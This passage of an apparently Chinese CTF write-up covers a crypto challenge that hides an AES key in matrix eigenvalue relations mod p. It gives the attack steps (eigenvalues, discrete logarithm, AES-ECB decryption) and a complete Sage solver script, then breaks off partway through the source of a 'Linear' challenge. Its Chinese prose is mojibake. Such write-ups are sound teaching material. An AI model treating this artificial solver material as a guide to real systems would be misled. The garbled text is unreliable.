çš„ç‰¹å¾å€¼å­˜åœ¨æŒ‡æ•°å…³ç³»ï¼š<ul><li>éé›¶ç‰¹å¾å€¼æ»¡è¶³ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>d</mi><mi>i</mi></msub><mo>=</mo><msubsup><mi>c</mi><mi>i</mi><mrow><mi>k</mi><mi>e</mi><mi>y</mi></mrow></msubsup><mspace></mspace><mspace width="0.6666666666666666em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext>â€‰</mtext><mtext>â€‰</mtext><mi>p</mi></mrow><annotation encoding="application/x-tex">d_i = c_i^{key} \mod p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.2438799999999999em;vertical-align:-0.276864em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9670159999999999em;"><span style="top:-2.4231360000000004em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span><span style="top:-3.1809080000000005em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mord mathnormal mtight">e</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.276864em;"><span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6666666666666666em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">p</span></span></span></span></li><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span></span></span></span> ç‰¹å¾å€¼ç›´æ¥å¯¹åº”</li></ul></li></ul><h4 id="3-åŠ å¯†æµç¨‹"><a class="markdownIt-Anchor" href="#3-åŠ å¯†æµç¨‹"></a> 3. <strong>åŠ å¯†æµç¨‹</strong></h4><ol><li>ç”Ÿæˆéšæœºå¯†é’¥ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi><mi>e</mi><mi>y</mi><mo>âˆˆ</mo><mo stretchy="false">[</mo><msup><mn>2</mn><mn>62</mn></msup><mo separator="true">,</mo><mi>p</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">key \in [2^{62}, p]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">âˆˆ</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">6</span><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">p</span><span class="mclose">]</span></span></span></span></li><li>ä½¿ç”¨ PKCS#7 å¡«å……å°† <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi><mi>e</mi><mi>y</mi></mrow><annotation encoding="application/x-tex">key</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span></span></span> æ‰©å±•ä¸º 16 å­—èŠ‚ AES å¯†é’¥</li><li>ç”¨ AES-ECB åŠ å¯†å¡«å……åçš„ flagï¼ˆå¡«å……è‡³ 64 å­—èŠ‚ï¼‰</li><li>è¾“å‡º <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi><mo separator="true">,</mo><mi>C</mi><mo separator="true">,</mo><mi>D</mi></mrow><annotation encoding="application/x-tex">p, C, D</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span></span></span></span> å’Œå¯†æ–‡ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mi>s</mi><mi>g</mi></mrow><annotation encoding="application/x-tex">msg</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">s</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span></span></span></span></li></ol><h4 id="4-æ”»å‡»æ€è·¯"><a class="markdownIt-Anchor" href="#4-æ”»å‡»æ€è·¯"></a> 4. <strong>æ”»å‡»æ€è·¯</strong></h4><ol><li><strong>æå–ç‰¹å¾å€¼</strong>ï¼š<ul><li>è®¡ç®— <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi></mrow><annotation encoding="application/x-tex">C</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span></span></span></span> çš„ç‰¹å¾å€¼ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>c</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>c</mi><mn>2</mn></msub><mo separator="true">,</mo><msub><mi>c</mi><mn>3</mn></msub><mo separator="true">,</mo><msub><mi>c</mi><mn>4</mn></msub><mo separator="true">,</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">{c_1, c_2, c_3, c_4, 0}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8388800000000001em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">0</span></span></span></span></span></li><li>è®¡ç®— <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>D</mi></mrow><annotation encoding="application/x-tex">D</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span></span></span></span> çš„ç‰¹å¾å€¼ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>d</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>d</mi><mn>2</mn></msub><mo separator="true">,</mo><msub><mi>d</mi><mn>3</mn></msub><mo separator="true">,</mo><msub><mi>d</mi><mn>4</mn></msub><mo separator="true">,</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">{d_1, d_2, d_3, d_4, 0}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">0</span></span></span></span></span></li></ul></li><li><strong>æ±‚è§£å¯†é’¥</strong>ï¼š<ul><li>å¯¹æ¯å¯¹éé›¶ç‰¹å¾å€¼ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><msub><mi>c</mi><mi>i</mi></msub><mo separator="true">,</mo><msub><mi>d</mi><mi>j</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(c_i, d_j)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.036108em;vertical-align:-0.286108em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span> æ±‚è§£ç¦»æ•£å¯¹æ•° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi><mi>e</mi><msub><mi>y</mi><mrow><mi>i</mi><mi>j</mi></mrow></msub><mo>=</mo><msub><mo><mi>log</mi><mo>â¡</mo></mo><msub><mi>c</mi><mi>i</mi></msub></msub><mo stretchy="false">(</mo><msub><mi>d</mi><mi>j</mi></msub><mo stretchy="false">)</mo><mspace></mspace><mspace width="0.6666666666666666em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext>â€‰</mtext><mtext>â€‰</mtext><mi>p</mi></mrow><annotation encoding="application/x-tex">key_{ij} = \log_{c_i}(d_j) \mod p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.980548em;vertical-align:-0.286108em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal">e</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.09424em;vertical-align:-0.34424em;"></span><span class="mop"><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.05725199999999997em;"><span style="top:-2.45586em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3280857142857143em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.34424em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6666666666666666em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">p</span></span></span></span></li><li>éªŒè¯ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi><mi>e</mi><msub><mi>y</mi><mrow><mi>i</mi><mi>j</mi></mrow></msub></mrow><annotation encoding="application/x-tex">key_{ij}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.980548em;vertical-align:-0.286108em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal">e</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span> æ˜¯å¦æ»¡è¶³æ‰€æœ‰ç‰¹å¾å€¼å…³ç³»</li></ul></li><li><strong>è§£å¯† flag</strong>ï¼š<ul><li>ç”¨ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi><mi>e</mi><mi>y</mi></mrow><annotation encoding="application/x-tex">key</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span></span></span> é‡æ„ AES å¯†é’¥</li><li>AES-ECB è§£å¯†å¹¶å»é™¤å¡«å……</li></ul></li></ol><h3 id="è§£å†³æ–¹æ¡ˆä»£ç "><a class="markdownIt-Anchor" href="#è§£å†³æ–¹æ¡ˆä»£ç "></a> è§£å†³æ–¹æ¡ˆä»£ç </h3><p>python</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> sage.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> GF, matrix<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> unpad<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-comment"># ===== è¾“å…¥æ•°æ®æ›¿æ¢ä¸ºå®é™…è¾“å‡º =====</span><br>p = <span class="hljs-number">123456789</span>  <span class="hljs-comment"># æ›¿æ¢ä¸ºå®é™…çš„ç´ æ•° p</span><br>C_list = [[...], [...], [...], [...], [...]]  <span class="hljs-comment"># æ›¿æ¢ä¸ºå®é™…çš„ 5x5 çŸ©é˜µ C</span><br>D_list = [[...], [...], [...], [...], [...]]  <span class="hljs-comment"># æ›¿æ¢ä¸ºå®é™…çš„ 5x5 çŸ©é˜µ D</span><br>msg = <span class="hljs-string">b&#x27;...&#x27;</span>  <span class="hljs-comment"># æ›¿æ¢ä¸ºå®é™…çš„å¯†æ–‡å­—èŠ‚ä¸²</span><br><br><span class="hljs-comment"># ===== ç‰¹å¾å€¼è®¡ç®— =====</span><br>Fp = GF(p)<br>C = matrix(Fp, C_list)<br>D = matrix(Fp, D_list)<br><br><span class="hljs-comment"># è®¡ç®—ç‰¹å¾å€¼</span><br>c_evals = C.charpoly().roots(ring=Fp, multiplicities=<span class="hljs-literal">False</span>)<br>d_evals = D.charpoly().roots(ring=Fp, multiplicities=<span class="hljs-literal">False</span>)<br><br><span class="hljs-comment"># è¿‡æ»¤éé›¶ç‰¹å¾å€¼</span><br>c_nonzero = [x <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> c_evals <span class="hljs-keyword">if</span> x != Fp(<span class="hljs-number">0</span>)]<br>d_nonzero = [y <span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> d_evals <span class="hljs-keyword">if</span> y != Fp(<span class="hljs-number">0</span>)]<br><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(c_nonzero) != <span class="hljs-number">4</span> <span class="hljs-keyword">or</span> <span class="hljs-built_in">len</span>(d_nonzero) != <span class="hljs-number">4</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;é”™è¯¯ï¼šéé›¶ç‰¹å¾å€¼æ•°é‡ä¸è¶³&quot;</span>)<br>    sys.exit(<span class="hljs-number">1</span>)<br><br><span class="hljs-comment"># ===== æ±‚è§£ç¦»æ•£å¯¹æ•°æ¢å¤å¯†é’¥ =====</span><br>key_found = <span class="hljs-literal">None</span><br><span class="hljs-keyword">for</span> c_val <span class="hljs-keyword">in</span> c_nonzero:<br>    <span class="hljs-keyword">for</span> d_val <span class="hljs-keyword">in</span> d_nonzero:<br>        <span class="hljs-keyword">try</span>:<br>            k = d_val.log(c_val)  <span class="hljs-comment"># k = log_&#123;c_val&#125;(d_val)</span><br>            <span class="hljs-keyword">if</span> k &lt; <span class="hljs-number">2</span>**<span class="hljs-number">62</span>:<br>                <span class="hljs-keyword">continue</span><br>            <br>            <span class="hljs-comment"># éªŒè¯æ‰€æœ‰ç‰¹å¾å€¼</span><br>            valid = <span class="hljs-literal">True</span><br>            <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> c_nonzero:<br>                <span class="hljs-keyword">if</span> x**k <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> d_nonzero:<br>                    valid = <span class="hljs-literal">False</span><br>                    <span class="hljs-keyword">break</span><br>                    <br>            <span class="hljs-keyword">if</span> valid:<br>                key_found = k<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] æ‰¾åˆ°å¯†é’¥: <span class="hljs-subst">&#123;k&#125;</span>&quot;</span>)<br>                <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">if</span> key_found <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>        <span class="hljs-keyword">break</span><br><br><span class="hljs-keyword">if</span> key_found <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[-] å¯†é’¥æ¢å¤å¤±è´¥&quot;</span>)<br>    sys.exit(<span class="hljs-number">1</span>)<br><br><span class="hljs-comment"># ===== AES è§£å¯† =====</span><br>key_bytes = long_to_bytes(key_found)<br>pad_len = <span class="hljs-number">16</span> - <span class="hljs-built_in">len</span>(key_bytes)<br>key_padded = key_bytes + <span class="hljs-built_in">bytes</span>([pad_len] * pad_len)  <span class="hljs-comment"># PKCS#7 å¡«å……</span><br><br><span class="hljs-keyword">try</span>:<br>    cipher = AES.new(key_padded, AES.MODE_ECB)<br>    flag_padded = cipher.decrypt(msg)<br>    flag = unpad(flag_padded, <span class="hljs-number">64</span>)  <span class="hljs-comment"># ç§»é™¤å¡«å……</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] Flag: <span class="hljs-subst">&#123;flag.decode()&#125;</span>&quot;</span>)<br><span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[-] è§£å¯†å¤±è´¥: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><h2 id="linear"><a class="markdownIt-Anchor" href="#linear"></a> Linear</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> signal<br><br>signal.alarm(<span class="hljs-number">10</span>)<br><br>flag = os.getenv(<span class="hljs-string">&quot;LILCTF_FLAG&quot;</span>, <span class="hljs-string">&quot;LILCTF&#123;default&#125;&quot;</span>)<br><br>nrows = <span class="hljs-number">16</span><br>ncols = <span class="hljs-number">32</span><br><br>A = [[random.randint(<span class="hljs-number">1</span>, <span class="hljs-number">1919810</span>) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> 